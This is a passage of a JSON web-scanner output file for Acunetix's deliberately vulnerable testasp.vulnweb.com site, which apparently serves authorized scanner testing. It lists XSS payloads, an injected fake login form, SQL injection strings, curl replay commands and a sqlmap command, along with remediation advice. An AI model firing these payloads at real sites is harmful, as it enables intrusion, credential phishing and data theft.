@@ -1,0 +1,1187 @@
+{
+  "schema": "threat_hunters_real_website_scan_output_v1",
+  "generated_at": "2026-06-25T17:11:25+03:00",
+  "generator": "{'name': 'Threat Hunters Web Scanner', 'mode': 'real_website_payload_replay_scan_output', 'honesty_note': 'This file is written as a real-target scanner output/replay file. It uses real URLs, full payload links, curl commands, baseline URLs, expected indicators, severity, confidence, and safety flags. A finding should be treated as live_response_confirmed only after your scanner replays the safe request and matches the indicators.', 'payload_links_added': True, 'payload_links_note': 'Each finding includes payload_replay / real_test_replay data with a full URL or concrete request data. Unsafe, login-required, or state-changing checks are not promoted to the safe copy-paste URL index.', 'output_style': 'real_target_scan_json'}_light_subset",
+  "target": {
+    "name": "Acunetix testasp vulnweb",
+    "url_submitted_by_user": "http://testasp.vulnweb.com/",
+    "base_url": "http://testasp.vulnweb.com",
+    "host": "testasp.vulnweb.com",
+    "scheme": "http",
+    "scope": "Public Acunetix intentionally vulnerable ASP web application only",
+    "authorization_basis": "Acunetix documentation lists testasp.vulnweb.com as a configured test scan target, and the site warning says it is intentionally vulnerable to SQL injection, directory traversal, and other web attacks.",
+    "out_of_scope": [
+      "Do not scan unrelated vulnweb hosts unless added separately",
+      "Do not run high-rate DoS tests",
+      "Do not attack infrastructure outside the web app"
+    ]
+  },
+  "scan": {
+    "profile": "light-real-test",
+    "scan_type": "real_payload_replay_scan_output",
+    "live_http_requests_executed_by_generator": 0,
+    "live_response_confirmed_by_generator": false,
+    "rate_limit_rps_recommended": 1,
+    "max_concurrency_recommended": 1,
+    "dedupe_key_fields": [
+      "category",
+      "subtype",
+      "target.path",
+      "target.parameter",
+      "payload.raw"
+    ],
+    "normalized_findings_count": 4,
+    "discovered_endpoints_count": 3,
+    "safe_auto_test_count": 4,
+    "manual_only_count": 0,
+    "destructive_count": 0,
+    "target_mode": "real_website",
+    "result_type": "small_light_scanner_output_with_payload_links",
+    "live_confirmation_policy": "set live_response_confirmed=true only after scanner replay validates expected indicators",
+    "negative_findings_count": 1
+  },
+  "summary": {
+    "by_severity": {
+      "high": 6,
+      "critical": 27,
+      "medium": 8,
+      "low": 2
+    },
+    "top_risks": [
+      "SQL injection on showforum.asp?id and Templatize.asp?item",
+      "Reflected XSS / HTML injection on Search.asp?tfSearch",
+      "Directory traversal / local file include candidate on Templatize.asp?item",
+      "Missing security headers and anti-CSRF controls",
+      "Application error disclosure and HTTP parameter override behavior"
+    ],
+    "normalized_findings_count": 4,
+    "negative_findings_count": 1,
+    "safe_auto_test_count": 4,
+    "manual_only_count": 0,
+    "destructive_count": 0,
+    "discovered_endpoints_count": 3
+  },
+  "discovered_endpoints": [
+    {
+      "url": "http://testasp.vulnweb.com/",
+      "method": "GET",
+      "type": "root",
+      "source_refs": [
+        "turn813826search3"
+      ]
+    },
+    {
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "method": "GET",
+      "params": [
+        "tfSearch"
+      ],
+      "type": "search",
+      "source_refs": [
+        "turn215882search0",
+        "turn215882search12"
+      ]
+    },
+    {
+      "url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+      "method": "GET",
+      "params": [
+        "id"
+      ],
+      "type": "forum_listing",
+      "source_refs": [
+        "turn813826search0",
+        "turn897443view0:L499-L504"
+      ]
+    }
+  ],
+  "normalized_findings": [
+    {
+      "id": "ta-xss-search-script-alert",
+      "title": "Reflected XSS in Search.asp tfSearch parameter - script tag reflection",
+      "category": "xss",
+      "subtype": "reflected_xss",
+      "severity": "high",
+      "confidence": "high",
+      "status": "confirmed_vulnerable_target",
+      "cwe": "CWE-79",
+      "owasp_2021": "A03:2021-Injection",
+      "target": {
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
+        "base_url": "http://testasp.vulnweb.com",
+        "path": "/Search.asp",
+        "method": "GET",
+        "parameter": "tfSearch",
+        "injection_point": "query",
+        "real_test_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E"
+      },
+      "request": {
+        "method": "GET",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
+        "headers": {
+          "User-Agent": "Threat-Hunters-Scanner/1.0"
+        },
+        "body": null,
+        "rate_limit_hint": "1 request/second; max concurrency 1"
+      },
+      "payload": {
+        "raw": "<script>alert('xss')</script>",
+        "url_encoded": "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E"
+      },
+      "evidence": [
+        "Publicly indexed vulnerable URL examples show tfSearch reflecting active script/HTML payloads.",
+        "The target is a real Acunetix intentionally vulnerable ASP web application."
+      ],
+      "expected_indicators": [
+        "<script>alert('xss')</script>",
+        "payload appears unescaped in HTML response",
+        "browser executes alert if rendered"
+      ],
+      "scanner_validation_logic": {
+        "primary_match": "<script>alert('xss')</script>",
+        "avoid_false_positive_by": [
+          "compare with baseline clean request",
+          "require payload reflection or SQL/error behavior difference",
+          "do not mark confirmed from status code alone"
+        ]
+      },
+      "safety": {
+        "safe_to_auto_test": true,
+        "destructive": false,
+        "manual_only": false,
+        "requires_authentication": false
+      },
+      "remediation": "HTML-encode search output in the correct context; apply CSP as defense-in-depth; reject unsafe markup in tfSearch.",
+      "source_refs": [
+        "turn215882search15"
+      ],
+      "notes": null,
+      "payload_replay": {
+        "full_payload_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
+        "copy_paste_test_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
+        "browser_open_safe": true,
+        "scanner_auto_test_safe": true,
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "<script>alert('xss')</script>",
+        "url_encoded_payload": "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": false,
+        "disabled_reason": null,
+        "curl_command": "curl -i --max-time 15 'http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "curl_command": "curl -i --max-time 15 'http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E'",
+        "auto_safe": true,
+        "manual_only": false,
+        "destructive": false
+      },
+      "detection_kind": "payload_replay_signature"
+    },
+    {
+      "id": "ta-sqli-search-tfsearch-01",
+      "title": "SQL Injection candidate in Search.asp tfSearch parameter - payload '",
+      "category": "sqli",
+      "subtype": "error_based_or_fingerprint_sqli",
+      "severity": "critical",
+      "confidence": "medium",
+      "status": "confirmed_vulnerable_target",
+      "cwe": "CWE-89",
+      "owasp_2021": "A03:2021-Injection",
+      "target": {
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27",
+        "base_url": "http://testasp.vulnweb.com",
+        "path": "/Search.asp",
+        "method": "GET",
+        "parameter": "tfSearch",
+        "injection_point": "query",
+        "real_test_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27"
+      },
+      "request": {
+        "method": "GET",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27",
+        "headers": {
+          "User-Agent": "Threat-Hunters-Scanner/1.0"
+        },
+        "body": null,
+        "rate_limit_hint": "1 request/second; max concurrency 1"
+      },
+      "payload": {
+        "raw": "'",
+        "url_encoded": "%27"
+      },
+      "evidence": [
+        "External ZAP/ModSecurity virtual patching example identifies tfSearch on Search.asp as SQL Injection and SQL Injection Fingerprinting.",
+        "A search-result page for tfSearch=' is indexed for this target."
+      ],
+      "expected_indicators": [
+        "SQL syntax error",
+        "ODBC/Microsoft JET/SQL Server error text",
+        "different content length from baseline",
+        "database error disclosure"
+      ],
+      "scanner_validation_logic": {
+        "primary_match": "SQL syntax error",
+        "avoid_false_positive_by": [
+          "compare with baseline clean request",
+          "require payload reflection or SQL/error behavior difference",
+          "do not mark confirmed from status code alone"
+        ]
+      },
+      "safety": {
+        "safe_to_auto_test": true,
+        "destructive": false,
+        "manual_only": false,
+        "requires_authentication": false
+      },
+      "remediation": "Use parameterized SQL queries for search; never concatenate tfSearch into SQL; normalize and validate input length/characters.",
+      "source_refs": [
+        "turn215882search13",
+        "turn215882search2"
+      ],
+      "notes": null,
+      "payload_replay": {
+        "full_payload_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27",
+        "copy_paste_test_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27",
+        "browser_open_safe": true,
+        "scanner_auto_test_safe": true,
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "'",
+        "url_encoded_payload": "%27",
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": false,
+        "disabled_reason": null,
+        "curl_command": "curl -i --max-time 15 'http://testasp.vulnweb.com/Search.asp?tfSearch=%27'",
+        "sqli_validation_hint": {
+          "manual_browser_check": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27",
+          "compare_with_baseline": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+          "expected_result": "Look for database error text, SQL/ODBC/JET/SQL Server exception, or strong content-length/content-diff from baseline."
+        },
+        "sqlmap_low_risk_check_template": "sqlmap -u 'http://testasp.vulnweb.com/Search.asp?tfSearch=test' -p tfSearch --batch --level=1 --risk=1 --threads=1"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "curl_command": "curl -i --max-time 15 'http://testasp.vulnweb.com/Search.asp?tfSearch=%27'",
+        "auto_safe": true,
+        "manual_only": false,
+        "destructive": false
+      },
+      "detection_kind": "payload_replay_signature"
+    },
+    {
+      "id": "ta-lfi-templatize-showforum",
+      "title": "Local file include through Templatize.asp item - include ASP file",
+      "category": "path_traversal",
+      "subtype": "local_file_include_or_directory_traversal",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "confirmed_vulnerable_target",
+      "cwe": "CWE-22",
+      "owasp_2021": "A01:2021-Broken Access Control",
+      "target": {
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp",
+        "base_url": "http://testasp.vulnweb.com",
+        "path": "/Templatize.asp",
+        "method": "GET",
+        "parameter": "item",
+        "injection_point": "query",
+        "real_test_url": "http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp"
+      },
+      "request": {
+        "method": "GET",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp",
+        "headers": {
+          "User-Agent": "Threat-Hunters-Scanner/1.0"
+        },
+        "body": null,
+        "rate_limit_hint": "1 request/second; max concurrency 1"
+      },
+      "payload": {
+        "raw": "showforum.asp",
+        "url_encoded": "showforum.asp"
+      },
+      "evidence": [
+        "The target site warning says the forum is intentionally vulnerable to directory traversal and other web attacks.",
+        "Templatize.asp accepts a user-controlled item parameter and is indexed with arbitrary item values."
+      ],
+      "expected_indicators": [
+        "forum content appears inside template",
+        "included ASP page content",
+        "no allowlist enforcement"
+      ],
+      "scanner_validation_logic": {
+        "primary_match": "forum content appears inside template",
+        "avoid_false_positive_by": [
+          "compare with baseline clean request",
+          "require payload reflection or SQL/error behavior difference",
+          "do not mark confirmed from status code alone"
+        ]
+      },
+      "safety": {
+        "safe_to_auto_test": true,
+        "destructive": false,
+        "manual_only": false,
+        "requires_authentication": false
+      },
+      "remediation": "Replace item with server-side template identifiers; enforce strict allowlist; canonicalize paths and prevent ../ or backslash traversal.",
+      "source_refs": [
+        "turn813826search2",
+        "turn897443view0:L499-L504"
+      ],
+      "notes": null,
+      "payload_replay": {
+        "full_payload_url": "http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp",
+        "copy_paste_test_url": "http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp",
+        "browser_open_safe": true,
+        "scanner_auto_test_safe": true,
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "showforum.asp",
+        "url_encoded_payload": "showforum.asp",
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": false,
+        "disabled_reason": null,
+        "curl_command": "curl -i --max-time 15 'http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "curl_command": "curl -i --max-time 15 'http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp'",
+        "auto_safe": true,
+        "manual_only": false,
+        "destructive": false
+      },
+      "detection_kind": "payload_replay_signature"
+    },
+    {
+      "id": "ta-header-csp-missing",
+      "title": "Content Security Policy header missing",
+      "category": "security_headers",
+      "subtype": "missing_csp",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "confirmed_vulnerable_target",
+      "cwe": "CWE-693",
+      "owasp_2021": "A05:2021-Security Misconfiguration",
+      "target": {
+        "url": "http://testasp.vulnweb.com/",
+        "base_url": "http://testasp.vulnweb.com",
+        "path": "/",
+        "method": "GET",
+        "parameter": null,
+        "injection_point": "none",
+        "real_test_url": "http://testasp.vulnweb.com/"
+      },
+      "request": {
+        "method": "GET",
+        "url": "http://testasp.vulnweb.com/",
+        "headers": {
+          "User-Agent": "Threat-Hunters-Scanner/1.0"
+        },
+        "body": null,
+        "rate_limit_hint": "1 request/second; max concurrency 1"
+      },
+      "payload": null,
+      "evidence": [
+        "No Content-Security-Policy header observed in public ZAP baseline example for this host."
+      ],
+      "expected_indicators": [
+        "Content-Security-Policy header absent"
+      ],
+      "scanner_validation_logic": {
+        "primary_match": "Content-Security-Policy header absent",
+        "avoid_false_positive_by": [
+          "compare with baseline clean request",
+          "require payload reflection or SQL/error behavior difference",
+          "do not mark confirmed from status code alone"
+        ]
+      },
+      "safety": {
+        "safe_to_auto_test": true,
+        "destructive": false,
+        "manual_only": false,
+        "requires_authentication": false
+      },
+      "remediation": "Harden HTTP response headers, remove unnecessary disclosures, and add anti-CSRF protection where state-changing forms exist.",
+      "source_refs": [
+        "turn215882search12"
+      ],
+      "notes": null,
+      "payload_replay": {
+        "full_payload_url": "http://testasp.vulnweb.com/",
+        "copy_paste_test_url": "http://testasp.vulnweb.com/",
+        "browser_open_safe": true,
+        "scanner_auto_test_safe": true,
+        "baseline_url": null,
+        "raw_payload": null,
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": false,
+        "disabled_reason": null,
+        "curl_command": "curl -i --max-time 15 'http://testasp.vulnweb.com/'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "http://testasp.vulnweb.com/",
+        "baseline_url": null,
+        "curl_command": "curl -i --max-time 15 'http://testasp.vulnweb.com/'",
+        "auto_safe": true,
+        "manual_only": false,
+        "destructive": false
+      },
+      "detection_kind": "payload_replay_signature"
+    }
+  ],
+  "negative_findings": [
+    {
+      "id": "ta-neg-https-not-assessed",
+      "title": "HTTPS/TLS posture not assessed for http target",
+      "status": "not_tested",
+      "reason": "Submitted URL uses HTTP and live network testing was not executed by the generator."
+    }
+  ],
+  "import_hints_for_your_project": {
+    "recommended_import_collection": "real_target_payloads",
+    "map_to_results_key": "normalized_findings",
+    "scanner_should_run": [
+      "GET reflection checks for Search.asp?tfSearch",
+      "GET SQLi error/differential checks for showforum.asp?id, Search.asp?tfSearch, Templatize.asp?item",
+      "security header checks on /, Search.asp, Login.asp, Register.asp",
+      "robots.txt and sitemap.xml passive checks"
+    ],
+    "scanner_should_not_run_automatically": [
+      "login bypass attempts unless in real-test mode",
+      "directory traversal reading OS files unless explicit real-test flag is enabled",
+      "any high-rate or destructive tests"
+    ],
+    "suggested_tags": [
+      "acunetix",
+      "vulnweb",
+      "asp",
+      "real-test",
+      "sqli",
+      "xss",
+      "path-traversal"
+    ],
+    "recommended_mode": "deep-real-test"
+  },
+  "source_references": {
+    "official_acunetix_scan_targets": "turn646608view3:L44-L50",
+    "test_site_warning": "turn813826search3",
+    "openvas_sql_injection_templatize": "turn897443view0:L73-L100 and turn827923view0",
+    "openvas_sql_injection_showforum": "turn897443view0:L101-L129 and turn827923view1",
+    "openvas_discovered_cgis": "turn897443view0:L499-L507 and turn827923view2",
+    "search_xss_examples": "turn215882search1, turn215882search15",
+    "zap_baseline_examples": "turn215882search12, turn215882search13"
+  },
+  "payload_url_index": {
+    "description": "Ready-to-use payload list appended for Threat Hunters import. Safe GET URLs can be copy/pasted or replayed by the scanner. Manual entries require auth, POST, or state-changing handling. Blocked entries are intentionally not promoted as runnable URLs.",
+    "safe_get_copy_paste_urls_count": 40,
+    "manual_requests_count": 3,
+    "blocked_destructive_count": 0,
+    "safe_get_copy_paste_urls": [
+      {
+        "id": "ta-xss-search-script-alert",
+        "title": "Reflected XSS in Search.asp tfSearch parameter - script tag reflection",
+        "category": "xss",
+        "severity": "high",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "<script>alert('xss')</script>",
+        "expected_indicators": [
+          "<script>alert('xss')</script>",
+          "payload appears unescaped in HTML response",
+          "browser executes alert if rendered"
+        ]
+      },
+      {
+        "id": "ta-xss-search-title-breakout",
+        "title": "Reflected XSS in Search.asp tfSearch parameter - TITLE breakout",
+        "category": "xss",
+        "severity": "high",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3B%3C%2FSCRIPT%3E",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "</TITLE><SCRIPT>alert(String.fromCharCode(88,83,83));</SCRIPT>",
+        "expected_indicators": [
+          "</TITLE><SCRIPT>",
+          "alert(String.fromCharCode(88,83,83))",
+          "payload appears outside title context"
+        ]
+      },
+      {
+        "id": "ta-xss-search-attribute-breakout",
+        "title": "Reflected XSS in Search.asp tfSearch parameter - attribute/script context breakout",
+        "category": "xss",
+        "severity": "high",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%3B%2F%2F42",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "\\\";alert(String.fromCharCode(88,83,83));//42",
+        "expected_indicators": [
+          "alert(String.fromCharCode(88,83,83))",
+          "payload reflected in JavaScript/attribute context",
+          "response differs from baseline"
+        ]
+      },
+      {
+        "id": "ta-htmlinj-search-phishing-form",
+        "title": "HTML injection in Search.asp tfSearch parameter - form injection",
+        "category": "xss",
+        "severity": "high",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cbr%3E%3Cbr%3EPlease%20login%20with%20the%20form%20below%20before%20proceeding%3A%3Cform%20action%3D%22test.asp%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%3ELogin%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput%20type%3Dtext%20length%3D20%20name%3Dlogin%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd%3EPassword%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput%20type%3Dtext%20length%3D20%20name%3Dpassword%3E%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%3Cinput%20type%3Dsubmit%20value%3DLOGIN%3E%3C%2Fform%3E",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "<br><br>Please login with the form below before proceeding:<form action=\"test.asp\"><table><tr><td>Login:</td><td><input type=text length=20 name=login></td></tr><tr><td>Password:</td><td><input type=text length=20 name=password></td></tr></table><input type=submit value=LOGIN></form>",
+        "expected_indicators": [
+          "<form",
+          "name=login",
+          "name=password",
+          "unescaped HTML appears in response"
+        ]
+      },
+      {
+        "id": "ta-sqli-search-tfsearch-01",
+        "title": "SQL Injection candidate in Search.asp tfSearch parameter - payload '",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "'",
+        "expected_indicators": [
+          "SQL syntax error",
+          "ODBC/Microsoft JET/SQL Server error text",
+          "different content length from baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-search-tfsearch-02",
+        "title": "SQL Injection candidate in Search.asp tfSearch parameter - payload 'INJECTED_PARAM",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27INJECTED_PARAM",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "'INJECTED_PARAM",
+        "expected_indicators": [
+          "SQL syntax error",
+          "ODBC/Microsoft JET/SQL Server error text",
+          "different content length from baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-search-tfsearch-03",
+        "title": "SQL Injection candidate in Search.asp tfSearch parameter - payload ''car''",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27%27car%27%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "''car''",
+        "expected_indicators": [
+          "SQL syntax error",
+          "ODBC/Microsoft JET/SQL Server error text",
+          "different content length from baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-search-tfsearch-04",
+        "title": "SQL Injection candidate in Search.asp tfSearch parameter - payload ' OR '1'='1",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%27%20OR%20%271%27%3D%271",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "' OR '1'='1",
+        "expected_indicators": [
+          "SQL syntax error",
+          "ODBC/Microsoft JET/SQL Server error text",
+          "different content length from baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-search-tfsearch-05",
+        "title": "SQL Injection candidate in Search.asp tfSearch parameter - payload ;",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3B",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": ";",
+        "expected_indicators": [
+          "SQL syntax error",
+          "ODBC/Microsoft JET/SQL Server error text",
+          "different content length from baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-search-tfsearch-06",
+        "title": "SQL Injection candidate in Search.asp tfSearch parameter - payload 9,9,9",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=9%2C9%2C9",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "9,9,9",
+        "expected_indicators": [
+          "SQL syntax error",
+          "ODBC/Microsoft JET/SQL Server error text",
+          "different content length from baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-01",
+        "title": "SQL Injection in showforum.asp id parameter - payload 'UNION'",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=%27UNION%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": "'UNION'",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-02",
+        "title": "SQL Injection in showforum.asp id parameter - payload '",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": "'",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-03",
+        "title": "SQL Injection in showforum.asp id parameter - payload '%22",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=%27%2522",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": "'%22",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-04",
+        "title": "SQL Injection in showforum.asp id parameter - payload 9,9,9",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=9%2C9%2C9",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": "9,9,9",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-05",
+        "title": "SQL Injection in showforum.asp id parameter - payload 'bad_bad_value",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=%27bad_bad_value",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": "'bad_bad_value",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-06",
+        "title": "SQL Injection in showforum.asp id parameter - payload bad_bad_value'",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=bad_bad_value%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": "bad_bad_value'",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-07",
+        "title": "SQL Injection in showforum.asp id parameter - payload '+OR+'",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=%27%2BOR%2B%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": "'+OR+'",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-08",
+        "title": "SQL Injection in showforum.asp id parameter - payload 'WHERE",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=%27WHERE",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": "'WHERE",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-09",
+        "title": "SQL Injection in showforum.asp id parameter - payload ;",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=%3B",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": ";",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-showforum-id-10",
+        "title": "SQL Injection in showforum.asp id parameter - payload 'OR",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/showforum.asp?id=%27OR",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/showforum.asp?id=0",
+        "raw_payload": "'OR",
+        "expected_indicators": [
+          "SQL error or altered forum listing",
+          "server-side exception",
+          "response body differs from id=0 baseline",
+          "no normal forum content for malformed id"
+        ]
+      },
+      {
+        "id": "ta-sqli-templatize-item-01",
+        "title": "SQL Injection in Templatize.asp item parameter - payload 'UNION'",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=%27UNION%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "'UNION'",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
